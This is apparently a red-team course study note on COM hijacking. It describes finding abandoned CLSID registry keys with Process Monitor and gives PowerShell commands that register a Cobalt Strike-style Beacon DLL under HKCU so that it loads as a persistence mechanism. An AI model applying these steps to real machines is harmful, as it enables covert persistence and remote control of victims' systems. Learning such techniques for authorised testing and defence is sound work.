
Check [[COM Objects]] for theory.
Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).
[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is part of the excellent [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). It shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives.


## 🖊️ via Process Monitor

1) Start processmonitor.exe
2) Search for events with the following filters:

- _RegOpenKey_ operations.
- where the Result is _NAME NOT FOUND_.
- and the Path ends with _InprocServer32_.
![[procmon-filter.png]]
3) Let it run for about a minute. One aspect to look out for is the number of times a particular CLSID is loaded. If you hijack one that is loaded every couple of seconds, you're going to have a rough time - so it's well worth the additional effort to find one that's loaded semi-frequently but not so much so or loaded when a commonly used application (Word, Excel, Outlook, etc) is opened.
4) Once you pick up an CLSID, check if it exists in HKCU and HKCM:

`Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"`

`Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"`

6) To exploit this, we can create the necessary registry entries in HKCU and point them at a Beacon DLL.  Because this is still on our attacking machine, we'll point it straight at `C:\Payloads\http_x64.dll`.
```
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

If this was the victim machine, you have to drop the dll in the box. When the dll loads, you should get a beacon. 

## 📔 Description

- 

##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{07-02-2024}} 14:58
🏷️ tags: #redteam #crto 

---

